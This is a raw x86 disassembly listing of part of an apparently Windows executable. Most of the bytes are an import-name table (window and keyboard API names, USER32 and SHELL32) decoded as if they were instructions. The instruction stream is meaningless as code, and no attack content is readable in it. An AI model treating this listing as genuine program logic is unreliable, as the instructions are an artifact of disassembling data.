  41e3b8:	outs   dx,DWORD PTR ds:[esi]
  41e3b9:	jo     0x41e430
  41e3bb:	jo     0x41e40a
  41e3bd:	outs   dx,BYTE PTR gs:[esi]
  41e3bf:	jne    0x41e3c1
  41e3c1:	add    BYTE PTR ds:0x6c655202,dl
  41e3c7:	gs popa 
  41e3c9:	jae    0x41e430
  41e3cb:	inc    esp
  41e3cc:	inc    ebx
  41e3cd:	add    BYTE PTR [ebx],ch
  41e3cf:	add    dl,BYTE PTR [ebx+0x65]
  41e3d2:	outs   dx,BYTE PTR ds:[esi]
  41e3d3:	fs dec ebp
  41e3d5:	gs jae 0x41e44b
  41e3d8:	popa   
  41e3d9:	addr16 gs push edi
  41e3dc:	add    BYTE PTR [eax],al
  41e3de:	fild   DWORD PTR [ecx]
  41e3e0:	dec    ebp
  41e3e1:	outs   dx,DWORD PTR ds:[esi]
  41e3e2:	jbe    0x41e449
  41e3e4:	push   edi
  41e3e5:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e3ec:	mov    dl,0x0
  41e3ee:	inc    esp
  41e3ef:	jb     0x41e452
  41e3f1:	ja     0x41e439
  41e3f3:	jb     0x41e456
  41e3f5:	ins    DWORD PTR es:[edi],dx
  41e3f6:	gs inc ebx
  41e3f8:	outs   dx,DWORD PTR ds:[esi]
  41e3f9:	outs   dx,BYTE PTR ds:[esi]
  41e3fa:	je     0x41e46e
  41e3fc:	outs   dx,DWORD PTR ds:[esi]
  41e3fd:	ins    BYTE PTR es:[edi],dx
  41e3fe:	add    BYTE PTR [eax],al
  41e400:	stos   DWORD PTR es:[edi],eax
  41e401:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e405:	fs inc ebx
  41e407:	jne    0x41e47b
  41e409:	jae    0x41e47a
  41e40b:	jb     0x41e44e
  41e40d:	add    BYTE PTR [eax+0x2],ch
  41e410:	push   ebx
  41e411:	gs je  0x41e469
  41e414:	jae    0x41e47b
  41e416:	jb     0x41e467
  41e418:	bound  ebp,QWORD PTR [edx+0x65]
  41e41b:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41e41f:	outs   dx,WORD PTR ds:[esi]
  41e421:	jb     0x41e490
  41e423:	popa   
  41e424:	je     0x41e48f
  41e426:	outs   dx,DWORD PTR ds:[esi]
  41e427:	outs   dx,BYTE PTR ds:[esi]
  41e428:	push   edi
  41e429:	add    BYTE PTR [ecx+0x0],ah
  41e42c:	inc    ebx
  41e42d:	jb     0x41e494
  41e42f:	popa   
  41e430:	je     0x41e497
  41e432:	push   eax
  41e433:	outs   dx,DWORD PTR ds:[esi]
  41e434:	jo     0x41e4ab
  41e436:	jo     0x41e485
  41e438:	outs   dx,BYTE PTR gs:[esi]
  41e43a:	jne    0x41e43c
  41e43c:	xor    al,0x2
  41e43e:	push   ebx
  41e43f:	gs je  0x41e485
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	popa   
  41e444:	jae    0x41e4b9
  41e446:	dec    esp
  41e447:	outs   dx,DWORD PTR ds:[esi]
  41e448:	outs   dx,BYTE PTR ds:[esi]
  41e449:	addr16 push edi
  41e44b:	add    BYTE PTR [ebx+0x0],ah
  41e44e:	inc    ebx
  41e44f:	jb     0x41e4b6
  41e451:	popa   
  41e452:	je     0x41e4b9
  41e454:	push   edi
  41e455:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e45c:	push   edi
  41e45d:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  41e464:	outs   dx,DWORD PTR ds:[esi]
  41e465:	outs   dx,BYTE PTR ds:[esi]
  41e466:	imul   esp,DWORD PTR [ebx+0x0],0x49018500
  41e46d:	outs   dx,BYTE PTR ds:[esi]
  41e46e:	jae    0x41e4d5
  41e470:	jb     0x41e4e6
  41e472:	dec    ebp
  41e473:	outs   dx,BYTE PTR gs:[esi]
  41e475:	jne    0x41e4c0
  41e477:	je     0x41e4de
  41e479:	ins    DWORD PTR es:[edi],dx
  41e47a:	push   edi
  41e47b:	add    ah,ah
  41e47d:	add    DWORD PTR [edi+0x66],ecx
  41e480:	data16 jae 0x41e4e8
  41e483:	je     0x41e4d7
  41e485:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e48a:	scas   al,BYTE PTR es:[edi]
  41e48b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e48f:	fs inc ebx
  41e491:	jne    0x41e505
  41e493:	jae    0x41e504
  41e495:	jb     0x41e4ee
  41e497:	add    BYTE PTR [ebx],al
  41e499:	add    BYTE PTR [ecx+0x64],al
  41e49c:	push   0x75
  41e49e:	jae    0x41e514
  41e4a0:	push   edi
  41e4a1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  41e4a8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41e4ac:	add    BYTE PTR [eax],al
  41e4ae:	js     0x41e4b1
  41e4b0:	inc    edi
  41e4b1:	gs je  0x41e50b
  41e4b4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e4bb:	js     0x41e531
  41e4bd:	push   edi
  41e4be:	add    BYTE PTR [eax],al
  41e4c0:	push   cs
  41e4c1:	add    DWORD PTR [edi+0x65],eax
  41e4c4:	je     0x41e50a
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	addr16 inc ebx
  41e4c9:	je     0x41e53d
  41e4cb:	ins    BYTE PTR es:[edi],dx
  41e4cc:	dec    ecx
  41e4cd:	inc    esp
  41e4ce:	add    BYTE PTR [eax],al
  41e4d0:	mov    esp,0x6e695702
  41e4d5:	outs   dx,DWORD PTR fs:[esi]
  41e4d7:	ja     0x41e51f
  41e4d9:	jb     0x41e54a
  41e4db:	ins    DWORD PTR es:[edi],dx
  41e4dc:	push   eax
  41e4dd:	outs   dx,DWORD PTR ds:[esi]
  41e4de:	imul   ebp,DWORD PTR [esi+0x74],0x49018300
  41e4e5:	outs   dx,BYTE PTR ds:[esi]
  41e4e6:	jae    0x41e54d
  41e4e8:	jb     0x41e55e
  41e4ea:	dec    ebp
  41e4eb:	outs   dx,BYTE PTR gs:[esi]
  41e4ed:	jne    0x41e530
  41e4ef:	add    BYTE PTR [esi+0x73795302],al
  41e4f5:	je     0x41e55c
  41e4f7:	ins    DWORD PTR es:[edi],dx
  41e4f8:	push   eax
  41e4f9:	popa   
  41e4fa:	jb     0x41e55d
  41e4fc:	ins    DWORD PTR es:[edi],dx
  41e4fd:	gs je  0x41e565
  41e500:	jb     0x41e575
  41e502:	dec    ecx
  41e503:	outs   dx,BYTE PTR ds:[esi]
  41e504:	outs   dx,WORD PTR ds:[esi]
  41e506:	push   edi
  41e507:	add    BYTE PTR [edx],dh
  41e509:	add    DWORD PTR [edi+0x65],eax
  41e50c:	je     0x41e55b
  41e50e:	outs   dx,BYTE PTR gs:[esi]
  41e510:	jne    0x41e55b
  41e512:	je     0x41e579
  41e514:	ins    DWORD PTR es:[edi],dx
  41e515:	inc    ebx
  41e516:	outs   dx,DWORD PTR ds:[esi]
  41e517:	jne    0x41e587
  41e519:	je     0x41e51b
  41e51b:	add    BYTE PTR [ecx+0x4b6b5602],dh
  41e521:	gs jns 0x41e577
  41e524:	arpl   WORD PTR [ecx+0x6e],sp
  41e527:	push   edi
  41e528:	add    BYTE PTR [eax],al
  41e52a:	add    eax,DWORD PTR [edx]
  41e52c:	push   edx
  41e52d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e536:	popa   
  41e537:	jae    0x41e5ac
  41e539:	inc    ebp
  41e53a:	js     0x41e57d
  41e53c:	add    BYTE PTR [eax],al
  41e53e:	ret    
  41e53f:	add    BYTE PTR [ebp+0x6e],al
  41e542:	fs inc esp
  41e544:	imul   esp,DWORD PTR [ecx+0x6c],0x4600676f
  41e54b:	add    BYTE PTR [ebx+0x6c],al
  41e54e:	outs   dx,DWORD PTR ds:[esi]
  41e54f:	jae    0x41e5b6
  41e551:	inc    esp
  41e552:	gs jae 0x41e5c0
  41e555:	je     0x41e5c6
  41e557:	jo     0x41e559
  41e559:	add    BYTE PTR [eax+0x44734901],bl
  41e55f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  41e566:	jae    0x41e5db
  41e568:	popa   
  41e569:	addr16 gs push edi
  41e56c:	add    BYTE PTR [eax],al
  41e56e:	out    0x1,eax
  41e570:	dec    edi
  41e571:	jo     0x41e5d8
  41e573:	outs   dx,BYTE PTR ds:[esi]
  41e574:	inc    esp
  41e575:	gs jae 0x41e5e3
  41e578:	je     0x41e5e9
  41e57a:	jo     0x41e5d3
  41e57c:	add    BYTE PTR [eax],al
  41e57e:	and    BYTE PTR [edx],al
  41e580:	push   ebx
  41e581:	arpl   WORD PTR [edx+0x6f],si
  41e584:	ins    BYTE PTR es:[edi],dx
  41e585:	ins    BYTE PTR es:[edi],dx
  41e586:	push   edi
  41e587:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e58e:	add    BYTE PTR [eax],al
  41e590:	mov    al,ds:0x57734901
  41e595:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e59c:	xor    eax,0x61684300
  41e5a1:	jb     0x41e5f7
  41e5a3:	outs   dx,DWORD PTR ds:[esi]
  41e5a4:	dec    edi
  41e5a5:	gs ins DWORD PTR es:[edi],dx
  41e5a7:	push   edi
  41e5a8:	add    BYTE PTR [eax],al
  41e5aa:	xor    al,BYTE PTR [edx]
  41e5ac:	push   ebx
  41e5ad:	gs je  0x41e5f3
  41e5b0:	popa   
  41e5b1:	jb     0x41e618
  41e5b3:	je     0x41e605
  41e5b5:	outs   dx,DWORD PTR ds:[esi]
  41e5b6:	jae    0x41e5b8
  41e5b8:	daa    
  41e5b9:	add    DWORD PTR [edi+0x65],eax
  41e5bc:	je     0x41e609
  41e5be:	gs jns 0x41e623
  41e5c1:	outs   dx,DWORD PTR ds:[esi]
  41e5c2:	popa   
  41e5c3:	jb     0x41e629
  41e5c5:	push   esp
  41e5c6:	jns    0x41e638
  41e5c8:	gs add bh,ch
  41e5cb:	add    DWORD PTR [eax+0x65],edx
  41e5ce:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  41e5d3:	jae    0x41e636
  41e5d5:	addr16 gs push edi
  41e5d8:	add    BYTE PTR [eax],al
  41e5da:	push   0x74654701
  41e5df:	push   edi
  41e5e0:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  41e5e7:	add    BYTE PTR [ebx+0x72],al
  41e5ea:	gs popa 
  41e5ec:	je     0x41e653
  41e5ee:	inc    esp
  41e5ef:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41e5f6:	jb     0x41e659
  41e5f8:	ins    DWORD PTR es:[edi],dx
  41e5f9:	push   edi
  41e5fa:	add    BYTE PTR [eax],al
  41e5fc:	je     0x41e600
  41e5fe:	push   ebx
  41e5ff:	gs je  0x41e659
  41e602:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e609:	js     0x41e67f
  41e60b:	push   edi
  41e60c:	add    BYTE PTR [eax],al
  41e60e:	xchg   ebx,eax
  41e60f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e613:	je     0x41e687
  41e615:	outs   dx,DWORD PTR ds:[esi]
  41e616:	jns    0x41e659
  41e618:	arpl   WORD PTR [ebx+0x65],sp
  41e61b:	ins    BYTE PTR es:[edi],dx
  41e61c:	gs jb  0x41e680
  41e61f:	je     0x41e690
  41e621:	jb     0x41e677
  41e623:	popa   
  41e624:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e628:	cmc    
  41e629:	add    BYTE PTR [edi+0x65],al
  41e62c:	je     0x41e671
  41e62e:	ins    BYTE PTR es:[edi],dx
  41e62f:	popa   
  41e630:	jae    0x41e6a5
  41e632:	dec    ecx
  41e633:	outs   dx,BYTE PTR ds:[esi]
  41e634:	outs   dx,WORD PTR ds:[esi]
  41e636:	inc    ebp
  41e637:	js     0x41e67a
  41e639:	add    BYTE PTR [ebp+0x1],ch
  41e63c:	inc    edi
  41e63d:	gs je  0x41e697
  41e640:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e647:	outs   dx,BYTE PTR ds:[esi]
  41e648:	addr16 push edi
  41e64a:	add    BYTE PTR [eax],al
  41e64c:	fld    QWORD PTR [eax]
  41e64e:	inc    ebp
  41e64f:	jno    0x41e6c6
  41e651:	popa   
  41e652:	ins    BYTE PTR es:[edi],dx
  41e653:	push   edx
  41e654:	arpl   WORD PTR gs:[eax+eax*1+0x5b],si
  41e659:	add    dl,BYTE PTR [ebx+0x65]
  41e65c:	je     0x41e6b1
  41e65e:	arpl   WORD PTR [edx+0x6f],si
  41e661:	ins    BYTE PTR es:[edi],dx
  41e662:	ins    BYTE PTR es:[edi],dx
  41e663:	push   eax
  41e664:	outs   dx,DWORD PTR ds:[esi]
  41e665:	jae    0x41e667
  41e667:	add    BYTE PTR [edx+0x57734901],ah
  41e66d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  41e674:	imul   esp,DWORD PTR [ebx+0x6f],0xa6006564
  41e67b:	add    DWORD PTR [ebx+0x69],ecx
  41e67e:	ins    BYTE PTR es:[edi],dx
  41e67f:	ins    BYTE PTR es:[edi],dx
  41e680:	push   esp
  41e681:	imul   ebp,DWORD PTR [ebp+0x65],0x1810072
  41e688:	dec    ecx
  41e689:	outs   dx,BYTE PTR ds:[esi]
  41e68a:	push   ebx
  41e68b:	outs   dx,BYTE PTR gs:[esi]
  41e68d:	fs dec ebp
  41e68f:	gs jae 0x41e705
  41e692:	popa   
  41e693:	addr16 gs inc ebp
  41e696:	js     0x41e698
  41e698:	pop    ebx
  41e699:	add    BYTE PTR [ebx+0x72],al
  41e69c:	gs popa 
  41e69e:	je     0x41e705
  41e6a0:	dec    ecx
  41e6a1:	arpl   WORD PTR [edi+0x6e],bp
  41e6a4:	inc    esi
  41e6a5:	jb     0x41e716
  41e6a7:	ins    DWORD PTR es:[edi],dx
  41e6a8:	push   edx
  41e6a9:	gs jae 0x41e71b
  41e6ac:	jne    0x41e720
  41e6ae:	arpl   WORD PTR [ebp+0x0],sp
  41e6b1:	add    BYTE PTR [edx+0x0],cl
  41e6b4:	inc    ebx
  41e6b5:	outs   dx,DWORD PTR ds:[esi]
  41e6b6:	jo     0x41e731
  41e6b8:	inc    ecx
  41e6b9:	arpl   WORD PTR [ebx+0x65],sp
  41e6bc:	ins    BYTE PTR es:[edi],dx
  41e6bd:	gs jb  0x41e721
  41e6c0:	je     0x41e731
  41e6c2:	jb     0x41e718
  41e6c4:	popa   
  41e6c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41e6c9:	add    BYTE PTR [esi+0x66654400],cl
  41e6cf:	push   edi
  41e6d0:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41e6d7:	outs   dx,DWORD PTR ds:[esi]
  41e6d8:	arpl   WORD PTR [ecx+0x0],ax
  41e6db:	add    BYTE PTR [ebp+0x79656b02],bh
  41e6e1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41e6e5:	jbe    0x41e74c
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	je     0x41e6ea
  41e6ea:	fadd   QWORD PTR [eax]
  41e6ec:	inc    ebp
  41e6ed:	outs   dx,BYTE PTR ds:[esi]
  41e6ee:	jne    0x41e75d
  41e6f0:	push   edi
  41e6f1:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e6f8:	adc    eax,DWORD PTR [ecx]
  41e6fa:	inc    edi
  41e6fb:	gs je  0x41e742
  41e6fe:	outs   dx,DWORD PTR ds:[esi]
  41e6ff:	jne    0x41e763
  41e701:	ins    BYTE PTR es:[edi],dx
  41e702:	gs inc ebx
  41e704:	ins    BYTE PTR es:[edi],dx
  41e705:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  41e70c:	add    BYTE PTR [eax],al
  41e70e:	cwde   
  41e70f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e713:	je     0x41e787
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	jns    0x41e76f
  41e718:	imul   ebp,DWORD PTR [esi+0x64],0x2e00776f
  41e71f:	add    BYTE PTR [ebx+0x68],al
  41e722:	popa   
  41e723:	jb     0x41e775
  41e725:	jb     0x41e78c
  41e727:	jbe    0x41e76a
  41e729:	add    BYTE PTR [esi],ah
  41e72b:	add    dl,BYTE PTR [ebx+0x65]
  41e72e:	outs   dx,BYTE PTR ds:[esi]
  41e72f:	fs dec ebp
  41e731:	gs jae 0x41e7a7
  41e734:	popa   
  41e735:	addr16 gs inc ecx
  41e738:	add    BYTE PTR [eax],al
  41e73a:	mov    DWORD PTR [eax],eax
  41e73c:	inc    esp
  41e73d:	gs inc si
  41e740:	jb     0x41e7a3
  41e742:	ins    DWORD PTR es:[edi],dx
  41e743:	gs push eax
  41e745:	jb     0x41e7b6
  41e747:	arpl   WORD PTR [ecx+0x0],ax
  41e74a:	or     al,BYTE PTR [edx]
  41e74c:	push   edx
  41e74d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  41e756:	je     0x41e7a3
  41e758:	gs jns 0x41e75b
  41e75b:	add    BYTE PTR [eax],bh
  41e75d:	add    dl,BYTE PTR [ebx+0x65]
  41e760:	je     0x41e7a5
  41e762:	jne    0x41e7d6
  41e764:	jae    0x41e7d5
  41e766:	jb     0x41e768
  41e768:	push   0x1
  41e76a:	inc    edi
  41e76b:	gs je  0x41e7c5
  41e76e:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41e775:	add    BYTE PTR ds:0x74655302,bh
  41e77b:	inc    esp
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	addr16 dec ecx
  41e77f:	je     0x41e7e6
  41e781:	ins    DWORD PTR es:[edi],dx
  41e782:	dec    ecx
  41e783:	outs   dx,BYTE PTR ds:[esi]
  41e784:	je     0x41e786
  41e786:	sbb    eax,0x73614300
  41e78b:	arpl   WORD PTR [ecx+0x64],sp
  41e78e:	gs push edi
  41e790:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e797:	add    BYTE PTR [ebx],dh
  41e799:	add    DWORD PTR [edi+0x65],eax
  41e79c:	je     0x41e7eb
  41e79e:	outs   dx,BYTE PTR gs:[esi]
  41e7a0:	jne    0x41e7eb
  41e7a2:	je     0x41e809
  41e7a4:	ins    DWORD PTR es:[edi],dx
  41e7a5:	dec    ecx
  41e7a6:	inc    esp
  41e7a7:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  41e7ae:	outs   dx,DWORD PTR ds:[esi]
  41e7af:	addr16 inc edx
  41e7b1:	outs   dx,DWORD PTR ds:[esi]
  41e7b2:	js     0x41e804
  41e7b4:	popa   
  41e7b5:	jb     0x41e818
  41e7b7:	ins    DWORD PTR es:[edi],dx
  41e7b8:	inc    ecx
  41e7b9:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41e7c0:	arpl   WORD PTR [eax+0x54],bp
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	push   esp
  41e7c5:	push   0x69577369
  41e7ca:	outs   dx,BYTE PTR ds:[esi]
  41e7cb:	outs   dx,DWORD PTR fs:[esi]
  41e7cd:	ja     0x41e7cf
  41e7cf:	add    BYTE PTR [eax+eax*1],bh
  41e7d2:	inc    ebx
  41e7d3:	push   0x4d6b6365
  41e7d8:	outs   dx,BYTE PTR gs:[esi]
  41e7da:	jne    0x41e82e
  41e7dc:	popa   
  41e7dd:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41e7e5:	add    ah,al
  41e7e7:	add    DWORD PTR [ebp+0x61],ecx
  41e7ea:	jo     0x41e830
  41e7ec:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41e7f3:	arpl   WORD PTR [eax+eax*1-0x5],si
  41e7f7:	add    DWORD PTR [eax+0x74],edx
  41e7fa:	dec    ecx
  41e7fb:	outs   dx,BYTE PTR ds:[esi]
  41e7fc:	push   edx
  41e7fd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e802:	cdq    
  41e803:	add    DWORD PTR [ecx+0x73],ecx
  41e806:	inc    esp
  41e807:	ins    BYTE PTR es:[edi],dx
  41e808:	addr16 inc edx
  41e80a:	jne    0x41e880
  41e80c:	je     0x41e87d
  41e80e:	outs   dx,BYTE PTR ds:[esi]
  41e80f:	inc    ebx
  41e810:	push   0x656b6365
  41e815:	add    BYTE PTR fs:[eax],al
  41e818:	mov    edi,0x70737702
  41e81d:	jb     0x41e888
  41e81f:	outs   dx,BYTE PTR ds:[esi]
  41e820:	je     0x41e888
  41e822:	inc    ecx
  41e823:	add    BYTE PTR [ebx+0x1],bl
  41e826:	inc    edi
  41e827:	gs je  0x41e87d
  41e82a:	jns    0x41e89f
  41e82c:	je     0x41e893
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	dec    ebp
  41e830:	outs   dx,BYTE PTR gs:[esi]
  41e832:	jne    0x41e834
  41e834:	add    al,0x2
  41e836:	push   edx
  41e837:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e840:	popa   
  41e841:	jae    0x41e8b6
  41e843:	inc    ebp
  41e844:	js     0x41e89d
  41e846:	add    BYTE PTR [eax],al
  41e848:	pusha  
  41e849:	add    BYTE PTR [ebx+0x72],al
  41e84c:	gs popa 
  41e84e:	je     0x41e8b5
  41e850:	dec    ebp
  41e851:	outs   dx,BYTE PTR gs:[esi]
  41e853:	jne    0x41e855
  41e855:	add    al,bh
  41e857:	add    BYTE PTR [edi+0x65],al
  41e85a:	je     0x41e89f
  41e85c:	ins    BYTE PTR es:[edi],dx
  41e85d:	popa   
  41e85e:	jae    0x41e8d3
  41e860:	dec    esp
  41e861:	outs   dx,DWORD PTR ds:[esi]
  41e862:	outs   dx,BYTE PTR ds:[esi]
  41e863:	addr16 inc ecx
  41e865:	add    BYTE PTR ds:0x74654701,dh
  41e86b:	dec    ebp
  41e86c:	outs   dx,BYTE PTR gs:[esi]
  41e86e:	jne    0x41e8b9
  41e870:	je     0x41e8d7
  41e872:	ins    DWORD PTR es:[edi],dx
  41e873:	dec    ecx
  41e874:	outs   dx,BYTE PTR ds:[esi]
  41e875:	outs   dx,WORD PTR ds:[esi]
  41e877:	push   edi
  41e878:	add    BYTE PTR [eax],al
  41e87a:	mov    ecx,0x616f4c01
  41e87f:	fs dec ebp
  41e881:	outs   dx,BYTE PTR gs:[esi]
  41e883:	jne    0x41e8dc
  41e885:	add    BYTE PTR [edx+0x1],ah
  41e888:	inc    edi
  41e889:	gs je  0x41e8e0
  41e88c:	outs   dx,DWORD PTR ds:[esi]
  41e88d:	jo     0x41e8e6
  41e88f:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e896:	dec    ebx
  41e897:	add    DWORD PTR [edi+0x65],eax
  41e89a:	je     0x41e8ec
  41e89c:	jb     0x41e90d
  41e89e:	jo     0x41e8f7
  41e8a0:	add    BYTE PTR [eax],al
  41e8a2:	cmp    al,BYTE PTR [edx]
  41e8a4:	push   ebx
  41e8a5:	gs je  0x41e8eb
  41e8a8:	jne    0x41e91c
  41e8aa:	jae    0x41e91b
  41e8ac:	jb     0x41e8fe
  41e8ae:	outs   dx,DWORD PTR ds:[esi]
  41e8af:	jae    0x41e8b1
  41e8b1:	add    bh,al
  41e8b3:	add    DWORD PTR [ebp+0x61],ecx
  41e8b6:	jo     0x41e90e
  41e8b8:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41e8bf:	gs jns 0x41e907
  41e8c2:	js     0x41e91b
  41e8c4:	add    BYTE PTR [eax],al
  41e8c6:	jp     0x41e8ca
  41e8c8:	push   ebx
  41e8c9:	push   0x6143776f
  41e8ce:	jb     0x41e935
  41e8d0:	je     0x41e8d2
  41e8d2:	add    eax,0x67655202
  41e8d7:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41e8de:	popa   
  41e8df:	jae    0x41e954
  41e8e1:	push   edi
  41e8e2:	add    BYTE PTR [eax],al
  41e8e4:	scas   eax,DWORD PTR es:[edi]
  41e8e5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e8e9:	fs dec ecx
  41e8eb:	arpl   WORD PTR [edi+0x6e],bp
  41e8ee:	inc    ecx
  41e8ef:	add    bl,dh
  41e8f1:	add    BYTE PTR [edi+0x65],al
  41e8f4:	je     0x41e939
  41e8f6:	popa   
  41e8f7:	jb     0x41e95e
  41e8f9:	je     0x41e94b
  41e8fb:	outs   dx,DWORD PTR ds:[esi]
  41e8fc:	jae    0x41e8fe
  41e8fe:	jnp    0x41e902
  41e900:	push   ebx
  41e901:	push   0x7543776f
  41e906:	jb     0x41e97b
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	jb     0x41e90b
  41e90b:	add    BYTE PTR [eax+0x1],bl
  41e90e:	inc    edi
  41e90f:	gs je  0x41e965
  41e912:	jne    0x41e976
  41e914:	dec    ebp
  41e915:	outs   dx,BYTE PTR gs:[esi]
  41e917:	jne    0x41e919
  41e919:	add    cl,al
  41e91b:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  41e91f:	imul   esi,DWORD PTR [ebp+0x70],0x49
  41e923:	arpl   WORD PTR [edi+0x6e],bp
  41e926:	dec    ecx
  41e927:	fs inc esi
  41e929:	jb     0x41e99a
  41e92b:	ins    DWORD PTR es:[edi],dx
  41e92c:	inc    esp
  41e92d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41e934:	jns    0x41e936
  41e936:	push   ebp
  41e937:	push   ebx
  41e938:	inc    ebp
  41e939:	push   edx
  41e93a:	xor    esi,DWORD PTR [edx]
  41e93c:	cs fs ins BYTE PTR es:[edi],dx
  41e93f:	ins    BYTE PTR es:[edi],dx
  41e940:	add    BYTE PTR [eax],al
  41e942:	push   ebx
  41e943:	dec    eax
  41e944:	inc    ebp
  41e945:	dec    esp
  41e946:	dec    esp
  41e947:	xor    esi,DWORD PTR [edx]
  41e949:	cs fs ins BYTE PTR es:[edi],dx
  41e94c:	ins    BYTE PTR es:[edi],dx
  41e94d:	add    BYTE PTR [ebx+0x70],dh
  41e950:	push   ecx
  41e951:	dec    edx
  41e952:	push   0x47
  41e954:	jne    0x41e99c
  41e956:	jns    0x41e99f
  41e958:	push   edi
  41e959:	push   esi
  41e95a:	inc    edi
  41e95b:	ins    BYTE PTR es:[edi],dx
  41e95c:	inc    ecx
  41e95d:	inc    edi
  41e95e:	push   ds
  41e95f:	in     eax,dx
  41e960:	inc    ecx
  41e961:	add    BYTE PTR [esi],ah
  41e963:	in     eax,dx
  41e964:	inc    ecx
  41e965:	add    BYTE PTR [esi-0x10ffbe15],ah
  41e96b:	or     esi,DWORD PTR [edx+0x324f7d0e]
  41e971:	dec    edi
  41e972:	addr16 dec edi
  41e974:	xor    DWORD PTR [edi+0x4f],ecx
  41e977:	dec    edi
  41e978:	cmp    al,0x4f
  41e97a:	jp     0x41e9cb
  41e97c:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e97f:	dec    edi
  41e980:	es dec edi
  41e982:	jae    0x41e9d3
  41e984:	and    eax,0x224f324f
  41e989:	dec    edi
  41e98a:	push   ds
  41e98b:	push   edx
  41e98c:	pop    ds
  41e98d:	push   ebx
  41e98e:	cmp    eax,0x324f7d4f
  41e993:	dec    edi
  41e994:	addr16 dec edi
  41e996:	xor    DWORD PTR [edi+0x4f],ecx
  41e999:	dec    edi
  41e99a:	cmp    al,0x4f
  41e99c:	jp     0x41e9ed
  41e99e:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e9a1:	dec    edi
  41e9a2:	es dec edi
  41e9a4:	ins    DWORD PTR es:[edi],dx
  41e9a5:	dec    edi
  41e9a6:	and    eax,0x224f324f
  41e9ab:	dec    edi
  41e9ac:	push   ds
  41e9ad:	bound  ebx,QWORD PTR [edi]
  41e9af:	arpl   WORD PTR ds:0x324f7d4f,di
  41e9b5:	dec    edi
  41e9b6:	bound  ecx,QWORD PTR [edi+0x31]
  41e9b9:	dec    edi
  41e9ba:	jae    0x41ea0b
  41e9bc:	cmp    eax,0x384f404f
  41e9c1:	dec    edi
  41e9c2:	xor    cl,BYTE PTR [edi+0x24]
  41e9c5:	dec    edi
  41e9c6:	push   ds
  41e9c7:	jb     0x41e9e8
  41e9c9:	jae    0x41e9da
  41e9cb:	or     DWORD PTR [eax+eax*4],0x7c
  41e9cf:	nop
  41e9d0:	jge    0x41e963
  41e9d2:	aas    
  41e9d3:	dec    edi
  41e9d4:	dec    di
  41e9d6:	xor    cl,BYTE PTR [edi+0x66]
  41e9d9:	dec    edi
  41e9da:	ds dec edi
  41e9dc:	inc    eax
  41e9dd:	dec    edi
  41e9de:	cmp    eax,0x394f734f
  41e9e3:	dec    edi
  41e9e4:	xor    cl,BYTE PTR [edi+0x26]
  41e9e7:	dec    edi
  41e9e8:	push   ds
  41e9e9:	sbb    BYTE PTR [edi],0x83
  41e9ec:	setae  BYTE PTR [eax+edx*4]
  41e9f0:	jl     0x41e992
  41e9f2:	jge    0x41e995
  41e9f4:	aas    
  41e9f5:	dec    edi
  41e9f6:	dec    di
  41e9f8:	xor    cl,BYTE PTR [edi+0x66]
  41e9fb:	dec    edi
  41e9fc:	ds dec edi
  41e9fe:	inc    eax
  41e9ff:	dec    edi
  41ea00:	cmp    eax,0x394f6d4f
  41ea05:	dec    edi
  41ea06:	xor    cl,BYTE PTR [edi+0x26]
  41ea09:	dec    edi
  41ea0a:	push   ds
  41ea0b:	xchg   edx,eax
  41ea0c:	pop    ds
  41ea0d:	xchg   ebx,eax
  41ea0e:	bt     DWORD PTR [eax+eiz*4],ecx
  41ea12:	jl     0x41e9c4
  41ea14:	jge    0x41e9c7
  41ea16:	aas    
  41ea17:	dec    edi
